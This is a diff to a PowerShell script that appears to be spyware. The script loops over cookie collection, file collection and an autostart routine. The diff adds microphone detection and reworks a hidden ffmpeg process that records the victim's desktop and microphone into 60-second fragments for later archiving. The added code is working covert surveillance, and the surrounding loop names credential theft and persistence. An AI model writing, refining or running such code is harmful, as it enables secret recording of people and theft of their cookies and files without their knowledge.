@@ -67,77 +67,110 @@ function Collect-Files {
 
 }
 
+function Get-AudioDevice {
+    $ffmpeg = "$PSScriptRoot\ffmpeg.exe"
+    $raw = & $ffmpeg -list_devices true -f dshow -i dummy 2>&1
+
+    $devices = @()
+    foreach ($line in $raw) {
+        if ($line -match '"(.+?)"\s+\(audio\)') {
+            $devices += $matches[1]
+        }
+    }
+
+    if ($devices.Count -eq 0) {
+        Write-Warning "No available audio devices found"
+        return $null
+    }
+
+    $preferred = "Microphone"
+    $selected = $devices | Where-Object { $_ -eq $preferred }
+
+    if (!$selected) {
+        Write-Warning "Preferred device not found: $preferred"
+        $selected = $devices[0]
+        Write-Output "Using fallback audio device: $selected"
+    } else {
+        Write-Output "Using preferred audio device: $selected"
+    }
+
+    return $selected
+}
+
+
 
 
 function Start-Recording {
     $ffmpeg = "$PSScriptRoot\ffmpeg.exe"
     $recordingDir = "$env:USERPROFILE\luna_video_fragments"
-
-    if (!(Test-Path $ffmpeg)) {
-        Write-Warning "ffmpeg not found: $ffmpeg"
-        return $null
-    }
-
     if (!(Test-Path $recordingDir)) {
         New-Item -ItemType Directory -Path $recordingDir -Force | Out-Null
     }
 
+    $audioDevice = Get-AudioDevice
+    if (-not $audioDevice) {
+        Write-Warning "No audio device detected, recording video only."
+    }
+
     $file = "$recordingDir\frag_$(Get-Date -Format 'yyyyMMdd_HHmmss').mp4"
+
     $args = @(
-        "-f", "gdigrab", "-framerate", "15", "-i", "desktop",
-        "-f", "dshow", "-i", "audio=CABLE Output (VB-Audio Virtual Cable)",
-        "-vcodec", "libx264", "-preset", "veryfast",
-        "-acodec", "aac", "-ar", "44100", "-b:a", "128k",
-        "-t", "60",
-        "-y", "$file"
+        "-y",
+        "-f", "gdigrab",
+        "-framerate", "15",
+        "-i", "desktop"
     )
 
-    $startInfo = New-Object System.Diagnostics.ProcessStartInfo
-    $startInfo.FileName = $ffmpeg
-    $startInfo.Arguments = $args -join " "
-    $startInfo.RedirectStandardOutput = $true
-    $startInfo.RedirectStandardError = $true
-    $startInfo.UseShellExecute = $false
-    $startInfo.CreateNoWindow = $true
+    if ($audioDevice) {
+        $args += @(
+            "-f", "dshow",
+            "-i", "audio=$audioDevice",
+            "-map", "0:v:0",
+            "-map", "1:a:0"
+        )
+    } else {
+        Write-Warning "No audio input, video only."
+        $args += "-map", "0:v:0"
+        $args += "-an"
+    }
 
-    $process = New-Object System.Diagnostics.Process
-    $process.StartInfo = $startInfo
+    $args += @(
+        "-vcodec", "libx264",
+        "-preset", "veryfast",
+        "-acodec", "aac",
+        "-ar", "44100",
+        "-b:a", "128k",
+        "-t", "60",
+        "$file"
+    )
 
     Write-Output "Launching ffmpeg..."
-
     try {
-        $process.Start() | Out-Null
+        $process = Start-Process -FilePath $ffmpeg -ArgumentList $args -WindowStyle Hidden -PassThru
         $global:ffmpegProcess = $process
         Write-Output "ffmpeg started with PID: $($process.Id)"
 
-        $stdErr = $process.StandardError.ReadToEnd()
-
-        $process.WaitForExit()
+        $timeout = 10
+        while ($timeout -gt 0 -and !(Test-Path $file)) {
+            Start-Sleep -Seconds 1
+            $timeout--
+        }
 
         if (Test-Path $file) {
-            Write-Output "Recording completed: $file"
+            Write-Output "Recording file created: $file"
         } else {
-            Write-Warning "Recording failed - file not created"
-            Add-Content -Path "$tempDir\ffmpeg_error.log" -Value $stdErr
-            Write-Warning "Error log written to ffmpeg_error.log"
+            Write-Warning "Recording file not created. Possible input error."
         }
 
         return $file
     } catch {
-        Write-Warning "Start-Recording error: $_"
-        return $null
+        Write-Warning "Failed to start recording: $_"
+        return
     }
 }
 
-function Stop-Recording {
-    try {
-        Get-Process -Name "ffmpeg" -ErrorAction SilentlyContinue | Stop-Process -Force
-        Start-Sleep -Seconds 3 
-        Write-Output "Recording stopped"
-    } catch {
-        Write-Warning "Failed to stop recording: $_"
-    }
-}
+
+
 
 function Wait-Recording {
     try {
@@ -152,6 +185,19 @@ function Wait-Recording {
         Write-Warning "Wait-Recording exception: $_"
     }
 }
+
+
+function Stop-Recording {
+    try {
+        Get-Process -Name "ffmpeg" -ErrorAction SilentlyContinue | Stop-Process -Force
+        Start-Sleep -Seconds 3 
+        Write-Output "Recording stopped"
+    } catch {
+        Write-Warning "Failed to stop recording: $_"
+    }
+}
+
+
 
 
 
@@ -313,8 +359,8 @@ function Cleanup {
 while ($true) {
     Collect-Cookies
     Collect-Files
-    Start-Recording
     Ensure-Autostart
+    $file = Start-Recording
     Write-Output "Waiting for recording to finish..."
     Wait-Recording
     Write-Output "Recording done, proceeding to archive"
@@ -324,6 +370,7 @@ while ($true) {
     }
     Start-Sleep -Seconds 10
 }
+
 
 
 
